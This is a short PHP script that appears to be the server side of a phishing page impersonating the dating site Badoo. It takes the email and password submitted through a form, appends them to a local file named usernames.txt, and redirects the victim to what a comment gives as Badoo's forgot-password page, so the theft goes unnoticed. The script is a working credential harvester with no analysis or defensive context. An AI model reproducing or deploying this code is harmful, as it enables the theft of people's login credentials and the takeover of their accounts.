<?php

file_put_contents("usernames.txt", "Badoo Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://badoo.com/forgot/
header("Location: $url");
exit();
?>